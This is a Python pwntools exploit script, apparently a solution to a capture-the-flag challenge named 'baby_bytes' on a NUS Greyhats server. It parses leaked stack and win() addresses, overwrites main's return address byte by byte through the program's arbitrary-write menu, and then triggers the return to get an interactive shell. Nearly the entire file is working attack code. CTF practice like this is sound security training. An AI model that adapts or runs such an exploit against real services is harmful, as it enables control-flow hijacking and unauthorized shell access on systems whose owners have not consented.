from pwn import *

# Configuration
# context.binary = "./baby_bytes" # Not strictly needed for remote if offsets are hardcoded, but good practice
# elf = ELF(context.binary.path)   # Same as above

# --------------- IMPORTANT -----------------
# Offset from &choice to main's return address on the stack.
# Determined via GDB for YOUR specific binary and confirmed to be 0x1c
OFFSET_CHOICE_TO_MAIN_RET_ADDR = 0x1c
# --------------- IMPORTANT -----------------

# Remote target
HOST = "challs.nusgreyhats.org"
PORT = 33021

# Connect to remote
p = remote(HOST, PORT)

# For local testing (keep this commented out when running against remote)
# elf = ELF("./baby_bytes")
# p = process(elf.path)


# 1. Parse leaked addresses
p.recvuntil(b"Here's your address of choice (pun intended): ")
choice_addr_str = p.recvline().strip().decode()
choice_addr = int(choice_addr_str, 16)

p.recvuntil(b"You need to call the function at this address to win: ")
win_addr_str = p.recvline().strip().decode()
win_addr = int(win_addr_str, 16)

log.info(f"Remote target: {HOST}:{PORT}")
log.info(f"Address of 'choice': {hex(choice_addr)}")
log.info(f"Address of 'win()': {hex(win_addr)}")

# 2. Calculate the address on stack where main's return address is stored
main_ret_addr_location_on_stack = choice_addr + OFFSET_CHOICE_TO_MAIN_RET_ADDR
log.info(f"Calculated address of main's return address on stack: {hex(main_ret_addr_location_on_stack)}")

# 3. Overwrite main's return address on the stack with win_addr, byte by byte
for i in range(8): # 8 bytes for a 64-bit address
    target_byte_addr_on_stack = main_ret_addr_location_on_stack + i
    byte_to_write = (win_addr >> (i * 8)) & 0xFF # Get the i-th byte of win_addr

    log.info(f"Writing byte {hex(byte_to_write)} to stack address {hex(target_byte_addr_on_stack)}")

    # Wait for the "> " prompt before sending choice "2"
    p.sendlineafter(b"> ", b"2") # Choose option 2: Write byte

    # Wait for the "Enter the address..." prompt
    p.sendlineafter(b"Enter the address of the byte you want to write to in hex:", hex(target_byte_addr_on_stack).encode())
    
    # Wait for the "Enter the byte..." prompt
    p.sendlineafter(b"Enter the byte you want to change it to:", f"{byte_to_write:02x}".encode())

# 4. Trigger main to return
log.info("Main's return address overwritten. Sending invalid option '3' to make main return.")
p.sendlineafter(b"> ", b"3") # Send an invalid option to break the loop and return

# At this point, the remote program should print "Invalid option! Exiting..."
# and then main will execute 'leave; ret'. The 'ret' will pop win_addr into RIP.
log.info("Shell should be incoming...")
p.interactive() # Get the shell from the remote service